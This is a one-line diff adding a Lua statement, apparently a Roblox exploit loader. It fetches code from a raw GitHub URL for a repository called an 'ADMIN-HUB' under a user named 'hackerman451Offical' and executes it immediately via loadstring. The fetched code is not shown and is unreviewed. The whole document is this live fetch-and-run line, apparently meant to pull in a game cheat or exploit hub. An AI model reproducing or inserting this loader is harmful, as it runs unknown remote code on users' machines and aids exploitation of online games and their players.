@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hackerman451Offical/INDRIPRISXTENXXS-ADMIN-HUB/refs/heads/main/VERSION9/source"))();
